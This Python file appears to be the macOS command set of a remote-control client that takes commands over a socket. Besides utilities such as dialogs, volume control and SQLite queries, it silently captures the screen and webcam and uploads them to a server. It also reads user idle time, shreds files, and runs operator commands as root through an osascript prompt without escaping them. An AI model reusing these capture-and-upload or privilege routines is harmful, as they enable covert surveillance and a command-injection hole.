import os
import subprocess
import sys
import time

from client.commands.argument_command_registry import (
    ArgumentCommandSpec,
    ArgumentOptionSpec,
    argument_command,
)
from client.commands.command_context import CommandCancelledError, CommandTimeoutError
from client.commands.common import CommonCommands
from client.commands.interrupts import interruptible
from client.commands.platform.services.mac_platform_service import MacPlatformService
from core.utils.decorator import desc
from core.utils.formatting import get_time, format_dict, get_size
from core.utils.logger import logger

MSGBOX_ARGUMENT_SPEC = ArgumentCommandSpec(
    name='msgbox',
    description='Show a native macOS dialog',
    options=[
        ArgumentOptionSpec(name='title', option_type='str', required=False, default='', allow_empty=True,
                           help_text='Dialog title'),
        ArgumentOptionSpec(name='text', option_type='str', required=True, default=None, allow_empty=False,
                           help_text='Dialog text'),
        ArgumentOptionSpec(name='timeout', option_type='int', required=False, default=None,
                           help_text='Auto close timeout in seconds'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

NOTIFY_ARGUMENT_SPEC = ArgumentCommandSpec(
    name='notify',
    description='Show a native macOS notification',
    options=[
        ArgumentOptionSpec(name='title', option_type='str', required=False, default='', allow_empty=True,
                           help_text='Notification title'),
        ArgumentOptionSpec(name='text', option_type='str', required=True, default=None, allow_empty=False,
                           help_text='Notification text'),
        ArgumentOptionSpec(name='sound', option_type='flag', required=False, default=False,
                           help_text='Play the default notification sound'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

SQLITE_QUERY_SPEC = ArgumentCommandSpec(
    name='sqlite_query',
    description='Read-only SQLite query',
    options=[
        ArgumentOptionSpec(name='db', option_type='str', required=True, help_text='Database file path'),
        ArgumentOptionSpec(name='query', option_type='str', required=True, help_text='SQL query'),
        ArgumentOptionSpec(name='json', option_type='flag', required=False, default=False,
                           help_text='Output as JSON'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

IMAGE_INFO_SPEC = ArgumentCommandSpec(
    name='image_info',
    description='Show image metadata (size, resolution, color mode, EXIF)',
    options=[
        ArgumentOptionSpec(name='path', option_type='str', required=True, help_text='Image file path'),
        ArgumentOptionSpec(name='json', option_type='flag', required=False, default=False,
                           help_text='Output as JSON'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

IMPORT_CHECK_SPEC = ArgumentCommandSpec(
    name='import_check',
    description='Check Python package/module status',
    options=[
        ArgumentOptionSpec(name='module', option_type='str', required=True, help_text='Module name'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

ARCHIVE_PEEK_SPEC = ArgumentCommandSpec(
    name='archive_peek',
    description='List archive contents without extracting',
    options=[
        ArgumentOptionSpec(name='path', option_type='str', required=True, help_text='Archive file path'),
        ArgumentOptionSpec(name='limit', option_type='int', required=False, default=50,
                           help_text='Limit number of entries'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)


class MacCommands(CommonCommands):
    """macOS 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)
        self._mac_platform_service = MacPlatformService(self)

    def _run_command_text(self, command: str) -> str:
        return self._mac_platform_service.run_command_text(command, timeout=15)

    def _build_process_info(self):
        return self._mac_platform_service.build_process_info()

    def _escape_osascript_text(self, value: str):
        text = str(value or '')
        text = text.replace('\\', '\\\\')
        text = text.replace('"', '\\"')
        return text

    def _spawn_osascript(self, applescript: str):
        process = subprocess.Popen(
            ['osascript', '-e', applescript],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        self._register_cancel_handler(lambda: self._terminate_process(process))
        return process

    @desc("Capture a screenshot", group='platform')
    @interruptible()
    def screenshot(self):
        screenshot_path = f'screenshot_{get_time()}.png'
        capture_command = f'screencapture -x {screenshot_path}'

        try:
            self._send_interim_result(1, f'Capturing screen: {capture_command}')
            result = self._run_shell_command(capture_command, timeout=15)
            if result.returncode != 0:
                return 0, result.stderr or 'Failed to capture screenshot'

            self._send_interim_result(1, 'Screenshot captured successfully', 0)
            return self._upload_single_file_to_server_result(screenshot_path, category='screenshot')
        except CommandCancelledError:
            return 0, 'Screenshot command cancelled'
        except (CommandTimeoutError, subprocess.TimeoutExpired):
            return 0, 'Screenshot capture timed out and was terminated'
        except Exception as e:
            return 0, f'Failed to capture screenshot: {e}'
        finally:
            if os.path.isfile(screenshot_path):
                try:
                    os.remove(screenshot_path)
                except Exception:
                    pass

    @desc('Show system information', group='platform')
    @interruptible()
    def getinfo(self):
        try:
            payload = self._run_interruptible(self._build_process_info)
            return 1, format_dict(payload)
        except CommandCancelledError:
            return 0, 'Command cancelled'
        except CommandTimeoutError:
            return 0, 'Command timed out and was terminated'
        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to collect system information: {e}'

    @desc('Show user idle time', group='platform')
    @interruptible()
    def idletime(self):
        try:
            from Quartz import CGEventSourceSecondsSinceLastEventType, kCGEventSourceStateHIDSystemState, \
                kCGAnyInputEventType
            idle_seconds = self._run_interruptible(
                CGEventSourceSecondsSinceLastEventType,
                kCGEventSourceStateHIDSystemState,
                kCGAnyInputEventType,
            )
            return 1, f'User idle time: {idle_seconds:.2f} seconds'
        except CommandCancelledError:
            return 0, 'Command cancelled'
        except CommandTimeoutError:
            return 0, 'Command timed out and was terminated'
        except Exception as e:
            return 0, f'Failed to read idle time: {e}'

    @desc('Capture webcam photo', group='platform')
    @interruptible()
    def webcam_snap(self):
        """拍照并上传到服务器"""
        try:
            import subprocess
            import tempfile
            import os
            from core.utils.formatting import get_time, get_size

            result = subprocess.run(['which', 'imagesnap'], capture_output=True)
            if result.returncode != 0:
                return 0, '请安装 imagesnap: brew install imagesnap'

            temp_file = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
            temp_file.close()

            subprocess.run(['imagesnap', '-w', '1', temp_file.name],
                           capture_output=True, timeout=5)

            if os.path.getsize(temp_file.name) > 0:
                self._upload_single_file_to_server_result(temp_file.name, category='webcam')
                file_size = get_size(os.path.getsize(temp_file.name))
                os.unlink(temp_file.name)

                return 1, f'Webcam photo captured: {temp_file.name} ({file_size})'
            else:
                os.unlink(temp_file.name)
                return 0, 'Failed to capture webcam photo'

        except Exception as e:
            return 0, f'Webcam capture failed: {e}'

    @desc('Launch new instance with sudo', group='platform')
    @interruptible()
    def sudo_self(self):
        """以 root 权限启动新实例，返回 PID"""
        import subprocess
        from core.utils.client_util import get_executable_path

        cmd = get_executable_path()

        # 使用 osascript 启动，不等待
        proc = subprocess.Popen(
            ['osascript', '-e', f'do shell script "{cmd}" with administrator privileges'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        return 1, f'New instance launched with sudo (parent PID: {proc.pid})'

    @desc('Run command with sudo', group='platform')
    @interruptible()
    def sudo_run(self, command):
        """以 root 权限执行命令 (macOS)"""
        import subprocess
        try:
            result = subprocess.run(
                ['osascript', '-e', f'do shell script "{command}" with administrator privileges'],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                return 1, result.stdout
            return 0, result.stderr
        except Exception as e:
            return 0, f'Failed: {e}'

    @desc('Securely delete file (overwrite)', group='file')
    @interruptible()
    def file_shred(self, path):
        """安全删除文件（覆写后删除）"""
        try:
            import os

            target = self._resolve_target_path(path)
            if not os.path.exists(target):
                return 0, f'Path not found: {target}'

            if os.path.isdir(target):
                return 0, 'Use rmdir for directories'

            # 获取文件大小
            size = os.path.getsize(target)

            self._send_interim_result(1, f'Shredding {target} ({size} bytes)', 0)

            # 多次覆写
            with open(target, 'r+b') as f:
                for i in range(3):
                    self._ensure_not_interrupted()
                    f.seek(0)
                    # 第一次: 0x00
                    f.write(b'\x00' * size)
                    f.flush()

                    self._ensure_not_interrupted()
                    f.seek(0)
                    # 第二次: 0xFF
                    f.write(b'\xFF' * size)
                    f.flush()

                    self._ensure_not_interrupted()
                    f.seek(0)
                    # 第三次: 随机数据
                    f.write(os.urandom(size))
                    f.flush()

            # 最后删除
            os.remove(target)

            return 1, f'File securely deleted: {target}'

        except Exception as e:
            return 0, f'Failed to shred file: {e}'

    @desc('Get/set system volume', group='system')
    @interruptible()
    def volume(self, level=None):
        """获取或设置系统音量 (0-100)"""
        try:
            import subprocess

            # 检查是否有参数传入
            if level is None or level == '':
                result = subprocess.run(['osascript', '-e', 'output volume of (get volume settings)'],
                                        capture_output=True, text=True)
                current = result.stdout.strip()
                return 1, f'Current volume: {current}'
            else:
                level = int(level)
                if level < 0:
                    level = 0
                elif level > 100:
                    level = 100
                subprocess.run(['osascript', '-e', f'set volume output volume {level}'], capture_output=True)
                return 1, f'Volume set to {level}'
        except Exception as e:
            return 0, f'Failed: {e}'

    @argument_command('msgbox', spec=MSGBOX_ARGUMENT_SPEC)
    def _acmd_msgbox(self, args_dict, payload=None):
        try:
            title = args_dict.get('title', '')
            text = args_dict['text']
            timeout = args_dict.get('timeout')
            escaped_text = self._escape_osascript_text(text)
            escaped_title = self._escape_osascript_text(title)
            applescript = f'display dialog "{escaped_text}" with title "{escaped_title}" buttons {{"OK"}} default button "OK"'
            if timeout is not None and timeout > 0:
                applescript += f' giving up after {timeout}'
            process = self._spawn_osascript(applescript)
            return 1, f'Message box launched asynchronously: {title or "(no title)"}\nPID: {process.pid}'
        except Exception as e:
            return 0, f'Failed to launch message box: {e}'

    @argument_command('notify', spec=NOTIFY_ARGUMENT_SPEC)
    def _acmd_notify(self, args_dict, payload=None):
        try:
            title = args_dict.get('title', '')
            text = args_dict['text']
            sound = args_dict.get('sound', False)
            escaped_text = self._escape_osascript_text(text)
            escaped_title = self._escape_osascript_text(title)
            applescript = f'display notification "{escaped_text}"'
            if escaped_title:
                applescript += f' with title "{escaped_title}"'
            if sound:
                applescript += ' sound name "default"'
            process = self._spawn_osascript(applescript)
            return 1, f'Notification launched asynchronously: {title or "(no title)"}\nPID: {process.pid}'
        except Exception as e:
            return 0, f'Failed to launch notification: {e}'

    @argument_command('sqlite_query', spec=SQLITE_QUERY_SPEC)
    def _acmd_sqlite_query(self, args_dict, payload=None):
        """
        只读 SQLite 查询
        Examples:
            acmd sqlite_query --db /Users/flc/studio.db --query "PRAGMA table_list;"
            acmd sqlite_query --db /Users/flc/studio.db --query "PRAGMA table_info('bookings')"
            acmd sqlite_query --db /Users/flc/studio.db --query "select * from scenes"
        """
        try:
            import sqlite3
            import json

            db_path = args_dict.get('db', '')
            query = args_dict.get('query', '')
            output_json = args_dict.get('json', False)

            if not db_path or not query:
                return 0, 'db and query are required'

            if not os.path.isfile(db_path):
                return 0, f'Database file not found: {db_path}'

            # 只读模式打开
            conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()

            cursor.execute(query)
            rows = cursor.fetchall()

            result = [dict(row) for row in rows]
            conn.close()

            if output_json:
                return 1, json.dumps(result, ensure_ascii=False, indent=2)

            if not result:
                return 1, 'No results'

            headers = list(result[0].keys())
            data = [[str(row[h]) for h in headers] for row in result[:100]]

            from core.utils.formatting import format_table
            return 1, format_table(headers, data)

        except sqlite3.Error as e:
            return 0, f'SQLite error: {e}'
        except Exception as e:
            return 0, f'Query failed: {e}'

    @argument_command('image_info', spec=IMAGE_INFO_SPEC)
    def _acmd_image_info(self, args_dict, payload=None):
        """获取图片信息"""
        try:
            from PIL import Image
            from PIL.ExifTags import TAGS
            import json

            img_path = args_dict.get('path', '')
            output_json = args_dict.get('json', False)

            if not img_path:
                return 0, 'path is required'

            if not os.path.isfile(img_path):
                return 0, f'File not found: {img_path}'

            from core.utils.formatting import get_size

            img = Image.open(img_path)

            info = {
                'path': img_path,
                'width': img.width,
                'height': img.height,
                'size': f"{img.width}x{img.height}",
                'format': img.format,
                'mode': img.mode,
                'file_size': get_size(os.path.getsize(img_path))
            }

            # 获取 EXIF 信息
            exif_tags = {
                271: 'make',
                272: 'model',
                42036: 'lens_model',
                33434: 'exposure_time',
                33437: 'f_number',
                34855: 'iso',
                36867: 'datetime_original',
                37386: 'focal_length',
                305: 'software',
                37510: 'user_comment',
                40961: 'color_space',
            }

            if hasattr(img, '_getexif') and img._getexif():
                raw_exif = img._getexif()
                for tag, value in raw_exif.items():
                    if tag in exif_tags:
                        # 处理元组类型
                        if isinstance(value, tuple):
                            value = f"{value[0]}/{value[1]}"
                        # 处理字节类型
                        elif isinstance(value, bytes):
                            value = value.decode('utf-8', errors='replace')
                        # 色彩空间映射
                        elif tag == 40961:
                            value = 'sRGB' if value == 1 else 'Uncalibrated'

                        info[exif_tags[tag]] = value

            img.close()

            if output_json:
                return 1, json.dumps(info, ensure_ascii=False, indent=2)

            from core.utils.formatting import format_dict
            return 1, format_dict(info, width=30)

        except ImportError:
            return 0, 'PIL not installed, install with: pip install Pillow'
        except Exception as e:
            return 0, f'Failed to get image info: {e}'

    @argument_command('import_check', spec=IMPORT_CHECK_SPEC)
    def _acmd_import_check(self, args_dict, payload=None):
        """检查 Python 包是否可以导入"""
        try:
            import importlib
            import importlib.metadata
            from pathlib import Path

            module_name = args_dict.get('module', '')

            if not module_name:
                return 0, 'module name is required'

            result = {
                'module': module_name,
                'importable': False,
                'module_path': None,
                'module_version': None,  # 模块内定义的 __version__
                'package_name': None,  # 实际安装的包名
                'package_version': None,  # 包的版本
                'package_dependencies': []  # 包的依赖
            }

            try:
                module = importlib.import_module(module_name)
                result['importable'] = True
                result['module_path'] = getattr(module, '__file__', None)

                # 模块版本（模块内部定义的）
                for attr in ['__version__', 'version', 'VERSION']:
                    if hasattr(module, attr):
                        result['module_version'] = str(getattr(module, attr))
                        break

                # 包信息（从 distribution 获取）
                if result['module_path']:
                    module_path = Path(result['module_path']).resolve()
                    for dist in importlib.metadata.distributions():
                        try:
                            dist_files = list(dist.files or [])
                            for file in dist_files:
                                if str(module_path).endswith(str(file)):
                                    result['package_name'] = dist.metadata['Name']
                                    result['package_version'] = dist.version
                                    result['package_dependencies'] = [str(req) for req in dist.requires or []]
                                    break
                            if result['package_name']:
                                break
                        except:
                            continue

            except ImportError as e:
                result['error'] = str(e)

            from core.utils.formatting import format_dict
            return 1, format_dict(result)

        except Exception as e:
            return 0, f'Check failed: {e}'

    @argument_command('archive_peek', spec=ARCHIVE_PEEK_SPEC)
    def _acmd_archive_peek(self, args_dict, payload=None):
        """查看压缩包内容"""
        try:
            import zipfile
            import tarfile

            archive_path = args_dict.get('path', '')
            limit = args_dict.get('limit', 50)

            if not archive_path:
                return 0, 'path is required'

            if not os.path.isfile(archive_path):
                return 0, f'File not found: {archive_path}'

            entries = []

            # ZIP
            if zipfile.is_zipfile(archive_path):
                with zipfile.ZipFile(archive_path, 'r') as zf:
                    for info in zf.infolist()[:limit]:
                        entries.append({
                            'name': info.filename,
                            'size': get_size(info.file_size),
                            'compressed': get_size(info.compress_size),
                            'date': f"{info.date_time[0]}-{info.date_time[1]:02d}-{info.date_time[2]:02d}"
                        })

            # TAR
            elif tarfile.is_tarfile(archive_path):
                with tarfile.open(archive_path, 'r') as tf:
                    for info in tf.getmembers()[:limit]:
                        entries.append({
                            'name': info.name,
                            'size': get_size(info.size),
                            'type': 'dir' if info.isdir() else 'file',
                            'date': time.strftime('%Y-%m-%d', time.localtime(info.mtime))
                        })
            else:
                return 0, 'Unsupported archive format'

            headers = ['Name', 'Size', 'Date']
            data = [[e['name'], str(e['size']), e.get('date', '-')] for e in entries]

            from core.utils.formatting import format_table
            result = format_table(headers, data)

            if len(entries) >= limit:
                result += f'\n... and more (limited to {limit})'

            return 1, result

        except Exception as e:
            return 0, f'Failed to peek archive: {e}'
